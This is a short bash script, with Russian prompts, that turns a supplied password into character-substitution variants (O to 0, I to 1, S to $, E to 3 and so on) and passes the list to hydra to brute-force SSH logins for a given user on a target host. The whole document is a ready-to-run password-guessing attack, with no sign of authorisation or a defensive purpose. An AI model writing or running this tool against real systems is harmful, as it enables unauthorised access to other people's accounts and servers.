#!/bin/bash
HOST="$1"
USER="$2"
PASSWORD="$3"
PASSFILE="password_variants.txt"
if [ -z "$HOST" ] || [ -z "$USER" ] || [ -z "$PASSWORD" ]; then
    echo "Использование: $0 <host> <user> <password>"
    exit 1
fi
declare -A replacements=(
    ["O"]="0"
    ["0"]="O"
    ["I"]="1"
    ["1"]="I"
    ["l"]="1"
    ["B"]="8"
    ["S"]="$"
    ["E"]="3"
)
function generate_variants() {
    local pass="$1"
    echo "$pass" > "$PASSFILE"
    for key in "${!replacements[@]}"; do
        sed "s/$key/${replacements[$key]}/g" "$PASSFILE" >> "$PASSFILE"
    done
    sort -u -o "$PASSFILE" "$PASSFILE"
}
generate_variants "$PASSWORD"
echo "Попытка входа по SSH с $HOST ($USER) и вариантами пароля..."
hydra -l "$USER" -P "$PASSFILE" "ssh://$HOST" -t 4
